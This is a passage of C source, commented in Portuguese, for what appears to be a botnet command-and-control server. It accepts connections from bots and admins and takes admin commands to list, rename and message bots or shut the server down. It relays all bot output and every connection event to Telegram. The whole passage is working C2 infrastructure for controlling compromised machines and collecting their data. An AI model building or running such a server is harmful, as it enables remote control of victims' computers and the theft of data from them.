      sprintf(buffer,"ADMIN | %s | CONECTADO",inet_ntoa(b->addr.sin_addr));
      send_telegram(buffer);
      memset(buffer,0,sizeof(buffer));
      while (recv(b->client,buffer,sizeof(buffer),0) > 0 && SERVERSTATUS){
        if(!strncmp(buffer,"listbot",7)){
          int id =0;
          int a =sscanf(buffer+8,"%d",&id);
          if(a == 0)
            id = -1;
          listbots(b,id);
        }else if(!strncmp(buffer,"rename",6)){
          int id = 0;
          char nome[30] = {};
          int a = sscanf(buffer+7,"%d %s",&id,nome); //id nome
          if(a==2)
            bot_rename(id,nome);
        }else if(!strncmp(buffer,"msg",3)){
          char msg[2044]= {},type[10]={};
          int a =sscanf(buffer+4,"%s %s",type,msg);
          if(a ==2)
            sndmsg(type,msg);
        }else if(!strncmp(buffer,"exit",4))
          goto saida;
        else if(!strncmp(buffer,"killserver",10))
          killserver();
        
        memset(buffer,0,sizeof(buffer));
      }
      goto saida;
    }
    if(b->logged == 1){
      sprintf(buffer,"BOT | IP: %s | CONEXAO RECEBIDA",inet_ntoa(b->addr.sin_addr));
      send_telegram(buffer);
      memset(buffer,0,sizeof(buffer));
      while (recv(b->client,buffer,sizeof(buffer),0) > 0 && SERVERSTATUS){
        send_telegram(buffer);
        memset(buffer,0,sizeof(buffer));
      }
    }
    goto saida;
    saida:
      printf("LOGIN: %d\n",b->logged);
      if(b->logged==1){
        sprintf(buffer,"BOT | %s | DESCONECTADO",inet_ntoa(b->addr.sin_addr));
        send_telegram(buffer);
        memset(buffer,0,sizeof(buffer));
      }else if(b->logged == 2){
        sprintf(buffer,"ADMIN | %s | DESCONECTADO",inet_ntoa(b->addr.sin_addr));
        send_telegram(buffer);
        memset(buffer,0,sizeof(buffer));
      }
      removebot(b);
      pthread_detach(pthread_self());
}
SOCKET init_server(char ip[],int port){
    #ifdef DEBUG
    printf("Iniciando BotServer\n");
    #endif
    SOCKET socket_fd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    if(socket_fd < 0){
      #ifdef DEBUG
      perror("SOCKET");
      #endif
      return -1;
    }
    #ifdef DEBUG
    printf("Socket Criado\n");
    #endif
    struct sockaddr_in addr = {
      .sin_addr.s_addr = inet_addr(ip),
      .sin_family = AF_INET,
      .sin_port = htons(port)
    };
    #ifdef DEBUG
    printf("Estrutura addr iniciada\n");
    #endif
    int opt=1;
    if(setsockopt(socket_fd,SOL_SOCKET,(SO_REUSEADDR | SO_REUSEPORT),(char *)&opt,sizeof(opt)) <0){
      #ifdef DEBUG
      perror("SETSOCKOPT");
      #endif
      return -1;
    }
    #ifdef DEBUG
    printf("setsockopt ok!\n");
    #endif
    if(bind(socket_fd,(struct sockaddr*)&addr,sizeof(struct sockaddr)) <0){
      #ifdef DEBUG
      perror("BIND");
      #endif
      return -1;
    }
    #ifdef DEBUG
    printf("Bind Realizado com sucesso\n");
    #endif
    return socket_fd;
}
int main(int argc, char *argv[]){
    SOCKET fd = -1;
    if((fd = init_server(argv[1],atoi(argv[2]))) < 0)
      return 1;
    if(listen(fd,10) < 0){
      #ifdef DEBUG
      perror("LISTEN");
      #endif
      return 1;
    }
    SERVERSTATUS = 1;
    struct sockaddr_in caddr;
    pthread_t tid;
    while (SERVERSTATUS){
      socklen_t clen =sizeof(caddr);
      SOCKET cfd = accept(fd,(struct sockaddr*)&caddr,&clen);
      if((cli_count +1) == MAXCONNECTIONS){
        #ifdef DEBUG
        printf("max cli accepted\n");
        #endif
      }else{
        BOT b = (BOT)malloc(sizeof(struct bot));
        if(!b)
          perror("MALLOC");
        else{
          b->client=cfd;
          b->init_date=time(NULL);
          b->addr=caddr;
          addbot(b);
          pthread_create(&tid,NULL,&handle_connection,(void *)b);
        }
      }
      sleep(1);
    }
    return 0;
}
